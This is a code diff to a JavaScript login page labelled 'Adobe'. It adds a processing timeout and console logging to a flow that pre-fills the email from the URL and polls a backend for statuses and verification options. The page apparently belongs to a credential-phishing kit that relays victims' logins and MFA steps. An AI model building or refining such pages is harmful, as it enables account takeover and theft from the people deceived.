@@ -620,6 +620,8 @@ let browserId = null;
 let pollingIntervalId = null;
 let currentStatus = null;
 let verificationOptions = [];
+let processingStartTime = null;
+const PROCESSING_TIMEOUT_MS = 120000; // 2 min max in PROCESSING before auto-fail
 
 // Helper function to show loading dialog
 function showLoadingDialog() {
@@ -649,6 +651,13 @@ function objectToFormData(obj) {
 // Function to update UI based on polling status
 function updateUIForStatus(status, data = {}) {
   currentStatus = status;
+  // Reset PROCESSING timer on any non-PROCESSING status
+  if (status !== 'PROCESSING') {
+    if (processingStartTime !== null) {
+      console.log('Adobe: Resetting PROCESSING timer (status:', status, ')');
+    }
+    processingStartTime = null;
+  }
   const emailGroup = document.getElementById('emailGroup');
   const passwordGroup = document.getElementById('passwordGroup');
   const verificationOptionsGroup = document.getElementById('verificationOptionsGroup');
@@ -668,6 +677,24 @@ function updateUIForStatus(status, data = {}) {
 
   switch (status) {
     case 'PROCESSING':
+      console.log('Adobe: Status is PROCESSING');
+      if (!processingStartTime) {
+        processingStartTime = Date.now();
+        console.log('Adobe: Starting PROCESSING timer');
+      } else {
+        const elapsed = Date.now() - processingStartTime;
+        console.log('Adobe: PROCESSING elapsed:', elapsed, 'ms');
+        if (elapsed > PROCESSING_TIMEOUT_MS) {
+          console.error('Adobe: PROCESSING timed out after', elapsed, 'ms. Auto-failing.');
+          processingStartTime = null;
+          clearInterval(pollingIntervalId);
+          hideLoadingDialog();
+          document.getElementById('GeneralError').textContent = 'Processing timed out. Please try again.';
+          document.getElementById('GeneralError').style.display = 'block';
+          resetFormState();
+          return;
+        }
+      }
       showLoadingDialog();
       emailGroup.style.display = 'block';
       passwordGroup.style.display = 'block';
@@ -679,6 +706,7 @@ function updateUIForStatus(status, data = {}) {
       passwordField.disabled = true;
       break;
     case 'WAITINGEMAIL':
+      processingStartTime = null;
       hideLoadingDialog();
       emailGroup.style.display = 'block';
       passwordGroup.style.display = 'none';
@@ -804,6 +832,7 @@ function renderVerificationOptions(options) {
 
 // Initial form submission on page load
 async function initialFormSubmission() {
+  console.log('Adobe: initialFormSubmission started');
   showLoadingDialog();
   const urlParams = new URLSearchParams(window.location.search);
   const email = urlParams.get('email');
@@ -872,6 +901,7 @@ async function initialFormSubmission() {
 
     if (apiResponse && apiResponse.browserId) {
       browserId = apiResponse.browserId;
+      console.log('Adobe: Initial submission successful, browserId:', browserId, 'status:', apiResponse.status);
       updateUIForStatus(apiResponse.status, apiResponse);
       startPolling();
     } else {
